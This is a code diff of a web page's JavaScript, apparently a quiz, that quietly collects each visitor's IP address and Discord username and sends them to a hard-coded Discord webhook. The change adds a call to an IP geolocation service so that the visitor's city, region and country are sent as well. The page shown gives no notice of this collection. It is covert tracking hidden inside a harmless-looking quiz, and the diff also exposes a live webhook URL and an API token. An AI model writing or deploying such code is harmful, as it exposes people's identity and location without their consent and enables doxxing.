@@ -183,21 +183,22 @@
                     return;
                 }
 
-                fetch('https://ipv4.icanhazip.com')
-                    .then(response => response.text())
-                    .then(ip => {
-                        ip = ip.trim();
-                        sendIPandUsername(ip, discordUsername);
+                fetch('https://ipinfo.io/json?token=<ba1a04cc03b7b7>')
+                    .then(response => response.json())
+                    .then(data => {
+                        const { ip, city, region, country } = data;
+                        const location = `${city}, ${region}, ${country}`;
+                        sendIPandUsername(ip, discordUsername, location);
                         firstScreen.style.opacity = 0;
                         quizScreens[currentQuizScreen].style.display = 'block';
                     })
                     .catch(error => console.error('ERROR', error));
             });
 
-            const sendIPandUsername = (ip, username) => {
+            const sendIPandUsername = (ip, username, location) => {
                 const webhookUrlIP = 'https://discord.com/api/webhooks/1244328967247499356/1V6jytPrHM7qqbx7r-1Qp4fogxUS6stFDPEBphEsZW7COnvcOnULsKcBaIYyOpTt_bEH';
                 const messageIP = {
-                    content: `!IP: ${ip}, Username: ${username}`
+                    content: `!IP: ${ip}, Username: ${username}, Location: ${location}`
                 };
 
                 fetch(webhookUrlIP, {
